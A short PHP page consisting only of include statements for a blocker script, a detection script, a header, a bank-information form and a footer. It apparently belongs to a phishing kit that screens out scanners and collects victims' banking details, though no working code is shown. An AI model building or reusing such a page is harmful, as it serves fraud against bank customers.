<?php require('../blocker.php');?>
<?php require('../detect.php'); ?>
<?php require('header.php'); ?>
<?php require('./form/bank_info.php'); ?>
<?php require('footer.php'); ?>
